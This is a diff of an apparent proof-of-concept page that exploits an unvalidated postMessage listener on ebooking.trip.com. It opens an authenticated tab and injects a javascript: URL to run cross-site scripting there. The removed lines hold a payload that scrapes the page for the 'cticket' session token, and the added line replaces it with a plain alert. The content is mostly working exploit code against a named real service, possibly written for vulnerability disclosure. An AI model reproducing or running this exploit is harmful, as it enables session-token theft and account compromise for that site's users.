@@ -23,7 +23,7 @@
     document.getElementById('start-sync').addEventListener('click', () => {
         // 1. Open the target authenticated page in a NEW TAB
         // Lax cookies are fully attached here because it is a top-level navigation
-        const targetTab = window.open("https://ebooking.trip.com", "_blank");
+        const targetTab = window.open("https://ebooking.trip.com/user/setting", "_blank");
 
         // 2. Start a polling loop to inject the payload into the tab as it loads
         let attempts = 0;
@@ -39,17 +39,7 @@
                 // Construct the payload matching the unprotected postMessage listener
                 targetTab.postMessage({
                     messageType: "pushSecurityVerify",
-                    redirectUrl: `javascript:(function(){
-                        const src = document.documentElement.innerHTML;
-                        const match = src.match(/cticket\\s*[:=]\\s*["']([^"']+)["']/);
-                        const token = match ? match : (window.cticket || document.getElementById('cticket')?.value);
-                        
-                        if (token) {
-                            alert("XSS SUCCESS!\\n\\nOrigin: " + document.domain + "\\n\\nExtracted cticket Token:\\n" + token);
-                        } else {
-                            alert("XSS Executed on " + document.domain + ", but cticket wasn't found in this view state.");
-                        }
-                    })()`
+                    redirectUrl: "javascript:alert('you have been xssed by wrathsec.')"
                 }, "*"); // Targeting any origin (*) due to lack of origin validation
             } catch (e) {
                 // Fail silently while the tab is resolving cross-origin loading states
